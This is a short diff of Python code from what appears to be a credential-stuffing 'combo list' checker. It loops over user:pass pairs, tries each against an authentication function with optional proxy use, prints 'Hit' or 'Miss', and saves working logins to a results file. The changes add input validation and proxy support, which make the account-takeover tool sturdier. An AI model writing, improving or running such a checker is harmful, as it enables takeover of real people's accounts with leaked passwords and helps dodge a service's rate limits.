@@ -77,15 +77,24 @@ def check():
         input("Press enter to exit.")
         sys.exit(0)
     
+    if len(lines) == 0:
+        print("The file you provided is empty! Is that the right file?")
+        input("Press enter to exit.")
+        sys.exit(0)
+
     for line in lines:
-        a = line.split(':')
-        user = a[0]
-        pasd = a[1]
-        if auth(user, pasd) == 1:
-            print('[' + user + ':' + pasd + '] Hit')
-            results.write(user + ':' + pasd)
+        array = line.split(':')
+        if len(array) != 2:
+            print(f"The following line is either not formatted correctly, or is not a user:pass set. Skipping this line...\n{line}")
+            continue
+        user = array[0]
+        passwrd = array[1]
+        if auth(user, passwrd, use_proxy) == 1:
+            print(f"[{user}:{passwrd}] Hit")
+            results.write(user + ':' + passwrd)
         else:
-            print('[' + user + ':' + pasd + '] Miss')
+            print(f"[{user}:{passwrd}]  Miss")
+
 
 def checkpLess():
     print('Please type the name of your combo list!\n')
